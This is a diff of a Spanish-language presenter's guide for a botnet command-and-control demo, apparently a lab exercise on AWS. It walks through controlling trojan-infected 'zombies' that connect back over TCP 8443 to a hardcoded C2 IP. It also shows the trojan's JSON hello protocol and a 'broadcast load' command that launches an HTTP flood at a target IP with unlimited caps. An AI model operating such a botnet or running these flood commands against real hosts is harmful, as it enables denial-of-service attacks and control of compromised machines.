@@ -1,48 +1,73 @@
-============================================================
- GUIA RAPIDA - DEMO BOTNET C2 (exposicion)
-============================================================
+Demo - Botnet C2.
 
-ANTES DE EMPEZAR
- 1. Verificar el servicio en AWS:   sudo systemctl status botnet-c2
- 2. Entrar a la consola del C2:     tmux attach -t botnet-c2
- 3. Tener a la vista:
-    - dashboard de Netdata de la victima (tunel SSH a localhost:19999)
-    - data/metricas.jsonl (evidencia de CPU/RAM/red)
+PASO A PASO:
 
-PASO A PASO DE LA DEMO
+- Cuando se ejecuta el troyano --- conexión inversa.
+
+- El panel C2 acepta el mensaje y espera el primer mensaje:
+{"type":"hello","agent_id":"zombie-01","hostname":"PC-LAB","os":"Windows 11","user":"maria","version":"0.1","secret":"..."}
+
+- Se valida si el JSON es valida, y elimina caracteres raros.
+
+- Se van conectando cada zombie al panel, y mandan heartbeat cada 10s.
+
  1. list
         -> tabla de zombies conectados (llegan solos: el troyano abre la
-           conexion inversa TCP 8443 y manda el "hello").
- 2. select 1
-        -> elegir el zombie #1 (marca * en la tabla).
+           conexión inversa TCP 8443 y manda el "hello").
+
+ 2. select <#>
+        -> elegir el zombie (marca * en la tabla).
+        Ejemplo: select 0   (usar el numero que mostro 'list')
+
  3. send info
         -> datos del equipo infectado: hostname, SO, usuario, CPUs.
+
  4. select all
         -> volver a apuntar a TODOS los zombies (marca > en la tabla).
+
  5. ping all
         -> prueba de vida: latencia de cada zombie.
- 6. broadcast load target=http://IP_VICTIMA duration=30 concurrency=50
-        -> los zombies disparan la inundacion HTTP contra la victima;
+
+ 6. broadcast load target=http://44.214.54.41 duration=60 concurrency=500
+        -> los zombies disparan la inundación HTTP contra la victima;
            en Netdata se ve subir CPU/RAM/red en vivo.
- 7. metrics manual
-        -> guarda cpu/ram/red en data/metricas.jsonl (las tomas
-           antes/durante/despues del load se guardan solas).
- 8. kick 1   (o  send stop  con un agente seleccionado)
-        -> expulsar / detener un agente.
 
-CIERRE
- - Salir sin apagar el C2: Ctrl+B y luego D  (detach de tmux)
- - Apagar el C2:            exit
+        El C2 ordena 500 conexiones; cada zombie ejecuta según su
+        capacidad (el test_agent sin variables se limita a 200 y el
+        .exe puede tener su propio tope interno).
+        Con VARIOS zombies, bajar concurrency a 200-300 para no
+        tumbar la victima (t3.micro) a media demo.
 
-QUE DECIR (resumen tecnico)
- - Conexion inversa: el troyano llama al C2 (TCP 8443), no al reves.
+ 7. metrics manual   (opcional)
+        -> las tomas antes/durante/despues del load YA se guardaron
+           solas en data/metricas.jsonl (esa es la evidencia fuerte,
+           con su run_id). 'metrics manual' agrega una toma extra
+           post-inundacion; sirve para mostrar que el comando existe.
+
+Notes
+
+ - Conexión inversa: el troyano llama al C2 (TCP 8443), no al reves.
  - Protocolo: una linea JSON por mensaje; el primero es el "hello" con
    id, hostname, SO, usuario y secret (luego heartbeat cada 10 s).
  - Flujo: el C2 ordena -> los zombies ejecutan (HTTP GET masivos)
    -> el C2 observa (API de Netdata :19999) y deja evidencia JSONL.
 
-TOPES DE LA INUNDACION (por si preguntan)
+COMO FUNCIONA EL HELLO / JSON
+ - El .exe trae grabada la IP del C2 (54.88.121.40, puerto 8443):
+   no la busca.
+ - Al ejecutarse, abre un socket TCP desde la PC de la victima hacia
+   el C2 (conexion inversa: la victima llama hacia afuera).
+ - NO es HTTP: el canal C2<->zombie es TCP crudo con un JSON por
+   linea de texto (max 64 KB). Lo unico HTTP del sistema es el
+   ataque zombie -> victima (los GET masivos).
+ - El primer mensaje que manda el troyano es el hello:
+   {"type":"hello","agent_id":"zombie-01","hostname":"PC-LAB",
+    "os":"Windows 11","user":"maria","secret":"..."}
+ - El C2 valida el JSON (y el secret, si esta configurado) y registra
+   al zombie; las columnas de 'list' salen de esos campos.
+
+TOPES DE LA INUNDACION
  - En .env: FLOOD_MAX_DURATION_S y FLOOD_MAX_CONCURRENCY.
    Vacio = topes por defecto (120 s / 200 conexiones por agente).
-   0 = sin tope (solo para el laboratorio autorizado).
+   0 = sin tope (en la instancia ya estan en 0, solo laboratorio).
  - Si se cambian, reiniciar el C2: sudo systemctl restart botnet-c2
